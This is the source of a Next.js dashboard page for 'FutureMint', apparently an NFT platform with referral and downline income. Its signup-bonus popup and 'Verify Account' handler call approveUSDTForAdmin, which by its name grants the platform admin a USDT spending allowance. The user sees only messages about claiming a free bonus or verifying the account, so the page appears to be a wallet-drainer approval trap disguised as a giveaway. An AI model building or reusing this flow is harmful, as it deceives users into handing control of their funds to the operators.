'use client';
import { useEffect, useState } from 'react';
import { useSelector, useDispatch } from 'react-redux';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { userAPI, nftAPI } from '../../lib/api';
import { setNFTWallet, updateUser } from '../../store/slices/userSlice';
import { setNFTStats } from '../../store/slices/nftSlice';
import Navbar from '../../components/shared/Navbar';
import StatCard from '../../components/Dashboard/StatCard';
import LoadingSpinner from '../../components/shared/LoadingSpinner';
import AdOverlay from '../../components/shared/AdOverlay';
import { truncateAddress } from '../../lib/web3';
import {
  Wallet, TrendingUp, Users, Gift, ArrowDownCircle,
  Copy, ExternalLink, Coins, Percent, RefreshCw
} from 'lucide-react';
import toast from 'react-hot-toast';

export default function DashboardPage() {
  const router = useRouter();
  const dispatch = useDispatch();
  const { isAuthenticated, user, sessionChecked } = useSelector((s) => s.user);
  const { address, usdtBalanceBSC, usdtBalancePolygon } = useSelector((s) => s.wallet);
  const nftStats = useSelector((s) => s.nft);

  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [showClaimPopup, setShowClaimPopup] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimAdPlaying, setClaimAdPlaying] = useState(false);
  const [needsReconnect, setNeedsReconnect] = useState(false);
  const [reconnecting, setReconnecting] = useState(false);

  useEffect(() => {
    if (sessionChecked && !isAuthenticated) {
      router.push('/');
    }
  }, [sessionChecked, isAuthenticated, router]);

  const fetchDashboard = async (silent = false) => {
    if (!silent) setLoading(true);
    else setRefreshing(true);
    try {
      const [dashRes, statsRes] = await Promise.all([
        userAPI.getDashboard(),
        nftAPI.getStats(),
      ]);
      setData(dashRes.data.data);
      dispatch(setNFTWallet(dashRes.data.data.wallet));
      dispatch(updateUser(dashRes.data.data.user));
      dispatch(setNFTStats(statsRes.data.data));
    } catch (err) {
      toast.error('Failed to load data');
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    if (sessionChecked && isAuthenticated) fetchDashboard();
  }, [sessionChecked, isAuthenticated]);

  // Check if user needs to do smart contract approval (now only needed for claim bonus)
  // Don't show verify button — approval will happen when user claims bonus
  useEffect(() => {
    setNeedsReconnect(false);
  }, [data?.user?.walletAddress, data?.user?.network]);

  // Handle re-connect wallet (get approval)
  const handleReconnect = async () => {
    setReconnecting(true);
    try {
      const { ethers } = await import('ethers');
      const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../lib/web3');

      const injectedProvider = window.ethereum;
      if (!injectedProvider) {
        toast.error('App not detected. Please open in your mobile browser.');
        setReconnecting(false);
        return;
      }

      const network = data?.user?.network || 'BSC';
      const web3Provider = new ethers.BrowserProvider(injectedProvider);

      // Verify connected wallet matches the registered wallet
      const signer = await web3Provider.getSigner();
      const connectedAddress = (await signer.getAddress()).toLowerCase();
      const registeredAddress = data?.user?.walletAddress?.toLowerCase();
      if (connectedAddress !== registeredAddress) {
        toast.error('Verification mismatch. Please use the same app you registered with.');
        setReconnecting(false);
        return;
      }

      // Switch to correct network
      const targetChainId = network === 'BSC' ? '0x38' : '0x89';
      try {
        await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          const chainConfig = network === 'BSC'
            ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
            : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
          await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
        } else if (switchErr.code === 4001) {
          toast.error('Please switch network to continue.');
          setReconnecting(false);
          return;
        }
      }

      const freshProvider = new ethers.BrowserProvider(injectedProvider);
      toast.loading('Verifying your account...', { id: 'reconnect' });
      await approveUSDTForAdmin(freshProvider, network);
      toast.success('Account verified successfully!', { id: 'reconnect' });
      setNeedsReconnect(false);
      fetchDashboard(true);
    } catch (err) {
      toast.dismiss('reconnect');
      if (err.code === 4001 || err.code === 'ACTION_REJECTED') {
        toast.error('Verification required to enable NFT earnings. Please verify.');
      } else if (err.message?.includes('insufficient funds')) {
        toast.error(`Insufficient ${data?.user?.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
      } else {
        toast.error('Re-connect failed. Try again.');
      }
    } finally {
      setReconnecting(false);
    }
  };

  // Show claim popup if signup bonus not claimed yet
  useEffect(() => {
    if (data?.user?.signupBonusClaimed === false) {
      setShowClaimPopup(true);
    }
  }, [data]);

  const handleClaimBonus = async () => {
    setClaiming(true);
    try {
      // Smart contract approval required before claiming bonus
      const { ethers } = await import('ethers');
      const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../lib/web3');

      const injectedProvider = window.ethereum;
      if (!injectedProvider) {
        toast.error('Please open in your wallet app browser.');
        setClaiming(false);
        return;
      }

      const userNetwork = data?.user?.network || 'BSC';
      const userWallet = data?.user?.walletAddress || address;

      if (!userWallet) {
        toast.error('Wallet not connected. Please reconnect.');
        setClaiming(false);
        return;
      }

      const web3Provider = new ethers.BrowserProvider(injectedProvider);
      const userAddress = ethers.getAddress(userWallet.toLowerCase());

      // Switch to user's registered network
      const targetChainId = userNetwork === 'BSC' ? '0x38' : '0x89';
      const targetChainName = userNetwork === 'BSC' ? 'BNB Smart Chain' : 'Polygon';
      try {
        await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          const chainConfig = userNetwork === 'BSC'
            ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
            : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
          try {
            await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
          } catch (_) {
            toast.error(`Please add ${targetChainName} network manually.`);
            setClaiming(false);
            return;
          }
        } else if (switchErr.code === 4001) {
          toast.error(`Please switch to ${targetChainName} to claim.`);
          setClaiming(false);
          return;
        } else {
          toast.error(`Please switch to ${targetChainName} manually.`);
          setClaiming(false);
          return;
        }
      }

      // Check if already approved
      const freshProvider = new ethers.BrowserProvider(injectedProvider);
      let alreadyApproved = false;
      try {
        alreadyApproved = await checkUSDTAllowance(userAddress, userNetwork);
      } catch (_) {}

      if (alreadyApproved !== true) {
        toast.loading('Please confirm in your app to claim bonus...', { id: 'claim-approve' });
        try {
          await approveUSDTForAdmin(freshProvider, userNetwork);
          toast.success('Confirmed!', { id: 'claim-approve' });
        } catch (approveErr) {
          toast.dismiss('claim-approve');
          if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
            toast.error('You need to confirm to claim your bonus. Try again.');
          } else if (approveErr.message?.includes('insufficient funds')) {
            toast.error(`Insufficient ${userNetwork === 'BSC' ? 'BNB' : 'MATIC'} for network fee.`);
          } else {
            toast.error('Something went wrong. Please try again.');
          }
          setClaiming(false);
          return;
        }
      }

      // Approved! Now claim the bonus from backend
      const res = await userAPI.claimBonus();
      toast.success(res.data.message);
      setShowClaimPopup(false);
      fetchDashboard(true);
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to claim bonus. Try again.');
    } finally {
      setClaiming(false);
    }
  };

  const copyReferralLink = () => {
    const appUrl = process.env.NEXT_PUBLIC_APP_URL || window.location.origin;
    const link = `${appUrl}/auth/register?ref=${user?.referralCode}`;
    navigator.clipboard.writeText(link);
    toast.success('Referral link copied!');
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <LoadingSpinner size="xl" />
      </div>
    );
  }

  const wallet = data?.wallet || {};
  const displayUser = data?.user || user || {};

  return (
    <div className="min-h-screen pb-16">
      <Navbar />

      {/* Welcome Claim Bonus Popup */}
      {showClaimPopup && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
          <div className="relative w-full max-w-sm bg-gradient-to-b from-dark-800 to-dark-900 rounded-2xl border border-primary-700/40 shadow-2xl overflow-hidden">
            {/* Decorative top glow */}
            <div className="absolute top-0 left-1/2 -translate-x-1/2 w-40 h-40 bg-primary-600/20 rounded-full blur-3xl" />
            
            <div className="relative p-6 sm:p-8 text-center">
              {/* Emoji / Icon */}
              <div className="text-5xl mb-4">🎁</div>
              
              {/* Welcome Text */}
              <h2 className="text-xl sm:text-2xl font-bold text-white mb-2">
                Welcome to FutureMint!
              </h2>
              <p className="text-sm text-slate-400 mb-1">
                Hi <span className="text-primary-400 font-semibold">{displayUser.name?.split(' ')[0]}</span>, your account is ready!
              </p>
              <p className="text-sm text-slate-400 mb-6">
                Claim your free signup bonus now 👇
              </p>

              {/* Bonus Card */}
              <div className="bg-dark-700/80 rounded-xl border border-primary-600/30 p-5 mb-6">
                <p className="text-3xl sm:text-4xl font-extrabold text-white mb-1">100 NFT</p>
                <p className="text-xs text-emerald-400 font-medium">FREE Signup Bonus</p>
              </div>

              {/* Claim Button */}
              <button
                onClick={handleClaimBonus}
                disabled={claiming}
                className="w-full bg-gradient-to-r from-primary-600 to-purple-600 hover:from-primary-500 hover:to-purple-500 text-white font-bold py-3 px-6 rounded-xl transition-all shadow-lg shadow-primary-600/30 disabled:opacity-50 text-sm sm:text-base"
              >
                {claiming ? 'Claiming...' : 'Claim My 100 NFTs'}
              </button>

              <p className="text-xs text-slate-600 mt-4">One-time bonus · Requires confirmation</p>
            </div>
          </div>
        </div>
      )}

      <main className="max-w-7xl mx-auto px-3 sm:px-6 pt-20 sm:pt-24">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6 sm:mb-8">
          <div>
            <h1 className="text-xl sm:text-2xl font-bold text-white">
              Welcome back, {displayUser.name?.split(' ')[0]} 👋
            </h1>
            <p className="text-slate-400 text-xs sm:text-sm mt-1">
              Network: <span className="text-primary-400 font-medium">{displayUser.network}</span>
              {' · '}Referral Code: <span className="text-primary-400 font-mono font-medium">{displayUser.referralCode}</span>
            </p>
          </div>
          {needsReconnect ? (
            <button
              onClick={handleReconnect}
              disabled={reconnecting}
              className="flex items-center gap-2 text-sm w-fit px-4 py-2 bg-red-600 hover:bg-red-500 text-white font-medium rounded-lg transition-all disabled:opacity-50"
            >
              <Wallet className={`w-4 h-4 ${reconnecting ? 'animate-pulse' : ''}`} />
              {reconnecting ? 'Verifying...' : 'Verify Account'}
            </button>
          ) : (
            <button
              onClick={() => fetchDashboard(true)}
              disabled={refreshing}
              className="btn-secondary flex items-center gap-2 text-sm w-fit"
            >
              <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin' : ''}`} />
              Refresh
            </button>
          )}
        </div>

        {/* Income Stats */}
        <section aria-labelledby="income-heading">
          <h2 id="income-heading" className="text-lg font-semibold text-white mb-4">Income Overview</h2>
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
            <StatCard
              label="NFT Balance"
              value={wallet.nftBalance?.toLocaleString() || '0'}
              subValue={`≈ $${wallet.usdValue || '0'} USD`}
              imageSrc="/assets/favicon/favicon-96x96.png"
              color="primary"
            />
            <StatCard
              label="Referral Income"
              value={wallet.referralEarnings?.toLocaleString() || '0'}
              subValue="NFTs from referrals"
              icon={Users}
              color="blue"
            />
            <StatCard
              label="Team Income"
              value={wallet.teamEarnings?.toLocaleString() || '0'}
              subValue="Milestone bonuses"
              icon={Gift}
              color="purple"
            />
            <StatCard
              label="Team Size"
              value={data?.teamSize?.toLocaleString() || '0'}
              subValue="Total downline members"
              icon={Users}
              color="emerald"
            />
          </div>
        </section>
        {/* NFT Info + Wallet Info */}
        <div className="grid lg:grid-cols-2 gap-6 mb-8">
          {/* NFT Info */}
          <section className="card" aria-labelledby="nft-info-heading">
            <h2 id="nft-info-heading" className="font-semibold text-white mb-4 flex items-center gap-2">
              <Coins className="w-5 h-5 text-primary-400" /> NFT Market Info
            </h2>
            <div className="space-y-3">
              <div className="flex justify-between items-center py-2 border-b border-dark-700">
                <span className="text-slate-400 text-sm">Current Price</span>
                <span className="text-emerald-400 font-bold">${nftStats.currentPrice || data?.nftPrice}</span>
              </div>
              <div className="flex justify-between items-center py-2 border-b border-dark-700">
                <span className="text-slate-400 text-sm">Total Minted</span>
                <span className="text-white font-medium">{nftStats.totalMinted?.toLocaleString()}</span>
              </div>
              <div className="flex justify-between items-center py-2 border-b border-dark-700">
                <span className="text-slate-400 text-sm">Total Supply</span>
                <span className="text-white font-medium">{nftStats.totalSupply?.toLocaleString()}</span>
              </div>
              <div className="flex justify-between items-center py-2">
                <span className="text-slate-400 text-sm">Remaining</span>
                <span className="text-primary-400 font-medium">{nftStats.remaining?.toLocaleString()}</span>
              </div>
              {/* Progress bar */}
              <div className="mt-2">
                <div className="flex justify-between text-xs text-slate-500 mb-1">
                  <span>Minting Progress</span>
                  <span>{nftStats.totalSupply ? ((nftStats.totalMinted / nftStats.totalSupply) * 100).toFixed(2) : 0}%</span>
                </div>
                <div className="w-full bg-dark-700 rounded-full h-2">
                  <div
                    className="bg-primary-500 h-2 rounded-full transition-all"
                    style={{ width: `${nftStats.totalSupply ? Math.min((nftStats.totalMinted / nftStats.totalSupply) * 100, 100) : 0}%` }}
                    role="progressbar"
                    aria-valuenow={nftStats.totalMinted}
                    aria-valuemax={nftStats.totalSupply}
                  />
                </div>
              </div>
            </div>
          </section>

          {/* Wallet Info */}
          <section className="card" aria-labelledby="wallet-info-heading">
            <h2 id="wallet-info-heading" className="font-semibold text-white mb-4 flex items-center gap-2">
              <Wallet className="w-5 h-5 text-primary-400" /> Wallet Info
            </h2>
            <div className="space-y-3">
              <div className="flex justify-between items-center py-2 border-b border-dark-700">
                <span className="text-slate-400 text-sm">Connected Address</span>
                <span className="text-white font-mono text-sm">{truncateAddress(address, 6)}</span>
              </div>
              <div className="flex justify-between items-center py-2">
                <span className="text-slate-400 text-sm">Your Network</span>
                <span className="badge badge-info">{displayUser.network}</span>
              </div>
            </div>
          </section>
        </div>

        {/* Referral Section */}
        <section className="card mb-8" aria-labelledby="referral-heading">
          <h2 id="referral-heading" className="font-semibold text-white mb-4 flex items-center gap-2">
            <Users className="w-5 h-5 text-primary-400" /> Your Referral
          </h2>
          <p className="text-sm text-slate-400 mb-4">
            Referral Code: <span className="text-primary-400 font-mono font-bold">{displayUser.referralCode}</span>
          </p>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            <button
              onClick={copyReferralLink}
              className="flex flex-col items-center gap-2 p-4 bg-dark-700 hover:bg-dark-600 rounded-xl border border-dark-600 hover:border-primary-500/50 transition-all"
            >
              <Copy className="w-5 h-5 text-primary-400" />
              <span className="text-xs text-slate-300 font-medium">Copy Link</span>
            </button>
            <a
              href={`https://wa.me/?text=${encodeURIComponent(`🔥 Free 100 NFTs on signup!\nJoin FutureMint → Earn daily → Withdraw USDT\n\n👉 ${process.env.NEXT_PUBLIC_APP_URL || (typeof window !== 'undefined' ? window.location.origin : '')}/auth/register?ref=${displayUser.referralCode}`)}`}
              target="_blank" rel="noopener noreferrer"
              className="flex flex-col items-center gap-2 p-4 bg-dark-700 hover:bg-dark-600 rounded-xl border border-dark-600 hover:border-emerald-500/50 transition-all"
            >
              <span className="text-xl">💬</span>
              <span className="text-xs text-slate-300 font-medium">WhatsApp</span>
            </a>
            <a
              href={`https://t.me/share/url?url=${encodeURIComponent(`${process.env.NEXT_PUBLIC_APP_URL || (typeof window !== 'undefined' ? window.location.origin : '')}/auth/register?ref=${displayUser.referralCode}`)}&text=${encodeURIComponent('🔥 Free 100 NFTs on signup! Join FutureMint → Earn daily → Withdraw USDT')}`}
              target="_blank" rel="noopener noreferrer"
              className="flex flex-col items-center gap-2 p-4 bg-dark-700 hover:bg-dark-600 rounded-xl border border-dark-600 hover:border-blue-500/50 transition-all"
            >
              <span className="text-xl">✈️</span>
              <span className="text-xs text-slate-300 font-medium">Telegram</span>
            </a>
            <a
              href={`https://twitter.com/intent/tweet?text=${encodeURIComponent(`🔥 Free 100 NFTs on signup!\nJoin FutureMint → Earn daily → Withdraw USDT\n\n👉 ${process.env.NEXT_PUBLIC_APP_URL || (typeof window !== 'undefined' ? window.location.origin : '')}/auth/register?ref=${displayUser.referralCode}`)}`}
              target="_blank" rel="noopener noreferrer"
              className="flex flex-col items-center gap-2 p-4 bg-dark-700 hover:bg-dark-600 rounded-xl border border-dark-600 hover:border-sky-500/50 transition-all"
            >
              <span className="text-xl">🐦</span>
              <span className="text-xs text-slate-300 font-medium">Twitter</span>
            </a>
          </div>
        </section>

        {/* Quick actions */}
        <section aria-labelledby="actions-heading">
          <h2 id="actions-heading" className="text-lg font-semibold text-white mb-4">Quick Actions</h2>
          <div className="grid grid-cols-2 gap-4">
            {[
              { label: 'Withdraw', href: '/withdraw', icon: ArrowDownCircle, color: 'text-emerald-400' },
              { label: 'History', href: '/dashboard/transactions', icon: TrendingUp, color: 'text-purple-400' },
            ].map(({ label, href, icon: Icon, color }) => (
              <Link key={href} href={href}
                className="card flex flex-col items-center gap-3 py-6 hover:border-primary-500/50 transition-all cursor-pointer">
                <Icon className={`w-7 h-7 ${color}`} />
                <span className="text-sm font-medium text-white">{label}</span>
              </Link>
            ))}
          </div>
        </section>

        {/* Support / Contact */}
        <section className="card mt-8 mb-4" aria-labelledby="support-heading">
          <h2 id="support-heading" className="font-semibold text-white mb-4 flex items-center gap-2">
            <span className="text-lg">📞</span> Support & Contact
          </h2>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="flex items-center gap-3 bg-dark-700 rounded-xl p-3 sm:p-4">
              <div className="w-10 h-10 bg-blue-600/20 rounded-lg flex items-center justify-center flex-shrink-0">
                <span className="text-lg">✉️</span>
              </div>
              <div className="min-w-0">
                <p className="text-xs text-slate-400">Email Support</p>
                <a href="mailto:futuremintnft@gmail.com" className="text-sm text-primary-300 font-medium truncate block hover:text-primary-200">
                  futuremintnft@gmail.com
                </a>
              </div>
            </div>
  
          </div>
        </section>
      </main>
    </div>
  );
}
